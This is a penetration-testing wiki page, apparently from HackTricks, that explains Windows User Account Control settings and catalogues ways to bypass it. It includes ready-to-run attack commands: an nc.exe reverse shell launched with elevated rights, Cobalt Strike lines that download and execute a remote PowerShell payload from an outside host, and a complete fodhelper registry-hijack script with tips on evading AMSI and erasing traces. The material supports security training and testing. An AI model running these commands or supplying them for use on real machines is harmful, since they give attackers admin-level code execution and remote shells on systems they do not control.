# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a **consent prompt for elevated activities**. Applications have different `integrity` levels, and a program with a **high level** can perform tasks that **could potentially compromise the system**. When UAC is enabled, applications and tasks always **run under the security context of a non-administrator account** unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.

When UAC is in place, an administrator user is given 2 tokens: a standard user key, to perform regular actions as regular level, and one with the admin privileges.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture. Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. The various settings are discussed in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:

### UAC Bypass Theory

Some programs are **autoelevated automatically** if the **user belongs** to the **administrator group**. These binaries have inside their _**Manifests**_ the _**autoElevate**_ option with value _**True**_. The binary has to be **signed by Microsoft** also.

Many auto-elevate processes expose **functionality via COM objects or RPC servers**, which can be invoked from processes running with medium integrity (regular user-level privileges). Note that COM (Component Object Model) and RPC (Remote Procedure Call) are methods Windows programs use to communicate and execute functions across different processes. For example, **`IFileOperation COM object`** is designed to handle file operations (copying, deleting, moving) and can automatically elevate privileges without a prompt.

Note that some checks might be performed, like checking if the process was run from the **System32 directory**, which can be bypassed for example **injecting into explorer.exe** or another System32-located executable.

Another way to bypass these checks is to **modify the PEB**. Every process in Windows has a Process Environment Block (PEB), which includes important data about the process, such as its executable path. By modifying the PEB, attackers can fake (spoof) the location of their own malicious process, making it appear to run from a trusted directory (like system32). This spoofed information tricks the COM object into auto-elevating privileges without prompting the user.

Then, to **bypass** the **UAC** (elevate from **medium** integrity level **to high**) some attackers use this kind of binaries to **execute arbitrary code** because it will be executed from a **High level integrity process**.

You can **check** the _**Manifest**_ of a binary using the tool _**sigcheck.exe**_ from Sysinternals. (`sigcheck.exe -m <file>`) And you can **see** the **integrity level** of the processes using _Process Explorer_ or _Process Monitor_ (of Sysinternals).

### Check UAC

To confirm if UAC is enabled do:

```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```

If it's **`1`** then UAC is **activated**, if its **`0`** or it **doesn't exist**, then UAC is **inactive**.

Then, check **which level** is configured:

```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

- If **`0`** then, UAC won't prompt (like **disabled**)
- If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)
- If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
- If **`3`** like `1` but not necessary on Secure Desktop
- If **`4`** like `2` but not necessary on Secure Desktop
- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

You can also check the groups of your user and get the integrity level:

```
net user %username%
whoami /groups | findstr Level
```

## UAC bypass

> [!TIP]
> Note that if you have graphical access to the victim, UAC bypass is straight forward as you can simply click on "Yes" when the UAC prompt appears

The UAC bypass is needed in the following situation: **the UAC is activated, your process is running in a medium integrity context, and your user belongs to the administrators group**.

It is important to mention that it is **much harder to bypass the UAC if it is in the highest security level (Always) than if it is in any of the other levels (Default).**

### UAC disabled

If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **execute a reverse shell with admin privileges** (high integrity level) using something like:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC "bypass" (full file system access)

If you have a shell with a user that is inside the Administrators group you can **mount the C$** shared via SMB (file system) local in a new disk and you will have **access to everything inside the file system** (even Administrator home folder).

> [!WARNING]
> **Looks like this trick isn't working anymore**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### UAC bypass with cobalt strike

The Cobalt Strike techniques will only work if UAC is not set at it's max security level

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** and **Metasploit** also have several modules to **bypass** the **UAC**.

### Fodhelper UAC bypass (HKCU ms-settings DelegateExecute hijack)

Abuses an autoElevated COM handler queried by `fodhelper.exe` when the current user is a local administrator (not at max UAC level). Plant a per-user handler under HKCU and launch fodhelper to execute without a prompt:

```powershell
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -w hidden -nop -e <base64-payload>" -Force
Start-Process -FilePath "C:\Windows\System32\fodhelper.exe"
```

Notes:
- No file write is required; everything occurs under HKCU.
- Replace `<base64-payload>` with your encoded command (e.g., reverse PowerShell). Avoid prompting contexts and AMSI if necessary.
- Clean up afterwards by removing the `ms-settings` key to reduce artifacts.

### KRBUACBypass

Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)which is a **compilation** of several UAC bypass exploits. Note that you will need to **compile UACME using visual studio or msbuild**. The compilation will create several executables (like `Source\Akagi\outout\x64\Debug\Akagi.exe`) , you will need to know **which one you need.**\
You should **be careful** because some bypasses will **prompt some other programs** that will **alert** the **user** that something is happening.

UACME has the **build version from which each technique started working**. You can search for a technique affecting your versions:

```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ should works)

### UAC Bypass with GUI

If you have access to a **GUI you can just accept the UAC prompt** when you get it, you don't really need a bypass it. So, getting access to a GUI will allow you to bypass the UAC.

Moreover, if you get a GUI session that someone was using (potentially via RDP) there are **some tools that will be running as administrator** from where you could **run** a **cmd** for example **as admin** directly without being prompted again by UAC like [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). This might be a bit more **stealthy**.

### Noisy brute-force UAC bypass

If you don't care about being noisy you could always **run something like** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) that **ask to elevate permissions until the user does accepts it**.

### Your own bypass - Basic UAC bypass methodology

If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
   1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
   2. **IFileOperation**: Windows 10.
4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.

### Another UAC bypass technique

Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** (this is more interesting if the binary searches this information inside the **HKCU**).
